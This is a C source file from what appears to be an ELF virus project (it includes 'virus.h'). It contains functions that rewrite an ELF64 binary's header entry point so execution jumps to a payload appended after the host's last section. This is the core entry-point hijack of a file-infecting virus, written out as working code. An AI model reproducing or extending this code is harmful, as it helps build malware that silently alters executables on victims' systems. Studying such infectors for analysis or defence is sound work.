#include "virus.h"
#include "disasm.h"
#include "disasm_utils.h"
#include "utils.h"
#include "compiler_utils.h"
#include "errors.h"

#define MAX_JUMP_LOCATIONS	5

/* -------------------------- change header entry --------------------------- */

static bool	change_header_entry(struct safe_ptr clone_ref,
			Elf64_Xword dist_payload_entry)
{
	Elf64_Ehdr	*hdr = safe(clone_ref, 0, sizeof(Elf64_Ehdr));

	if (!hdr) return errors(ERR_FILE, _ERR_F_CANT_READ_ELFHDR);

	Elf64_Addr	e_entry = hdr->e_entry;

	e_entry += dist_payload_entry;
	hdr->e_entry = e_entry;

	return true;
}

/* -------------------------------------------------------------------------- */

bool	change_entry(struct safe_ptr clone_ref, const struct entry *file_entry)
{
	Elf64_Xword	sh_offset          = file_entry->safe_shdr->sh_offset;
	size_t		offset_in_section  = file_entry->offset_in_section;
	size_t		entry_offset       = sh_offset + offset_in_section;
	size_t		payload_offset     = file_entry->end_of_last_section;
	Elf64_Xword	dist_payload_entry = payload_offset - entry_offset;

	change_header_entry(clone_ref, dist_payload_entry);

	return true;
}
